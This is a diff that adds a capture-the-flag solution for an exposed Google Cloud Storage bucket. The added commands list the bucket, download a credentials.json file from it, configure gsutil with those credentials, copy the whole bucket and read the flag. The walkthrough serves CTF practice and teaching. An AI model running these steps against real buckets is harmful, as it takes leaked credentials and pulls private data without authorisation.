@@ -8,7 +8,16 @@ https://jimmys-big-adventure.storage.googleapis.com/index.html
 
 #### Solution:
 
+- inspecting the page revels that it's hosted from google storage, thus some kind of `ACL` mishap happened there
+
 ```bash
+curl https://storage.googleapis.com/jimmys-big-adventure
+wget https://jimmys-big-adventure.storage.googleapis.com/credentials.json
+
+# configure with credentials.json
+gsutil config -e
+gsutil cp -r  gs://jimmys-big-adventure .
+cat ./jimmys-big-adventure/flag.txt 
 ```
 
 ---
